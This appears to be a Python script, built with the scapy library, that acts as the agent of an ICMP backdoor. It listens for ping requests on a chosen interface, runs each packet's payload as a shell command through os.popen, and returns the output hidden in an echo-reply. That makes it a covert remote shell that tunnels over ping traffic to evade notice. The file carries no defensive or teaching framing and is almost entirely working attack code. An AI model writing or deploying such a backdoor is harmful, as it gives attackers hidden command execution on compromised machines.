import os
from scapy.all import *
import sys

# sniff_callback
def echo_and_reply(pkt_pair):
    pkt = pkt_pair[1]
    send_pkt=pkt_pair[0]

    recv_cmd = pkt.load.decode('ascii')
    print("{} Tell You : {}".format(pkt.src, recv_cmd))

    send_id = pkt.payload.id
    #response = "I Get it"

    response = os.popen(recv_cmd).read()
    send(IP(dst=pkt.src)/ICMP(type="echo-reply",code=0, id=send_id)/response)

def main():
    conf.L3socket=L3RawSocket
    filter_str="icmp[icmptype]=icmp-echo"

    if len(sys.argv) != 2:
        print("agent [interface]")
        exit(1)
    else:
        interface = sys.argv[1]

    while True:
        ans, unans = sniff(iface=interface, filter=filter_str, prn=echo_and_reply)



if __name__ == "__main__":
    main()
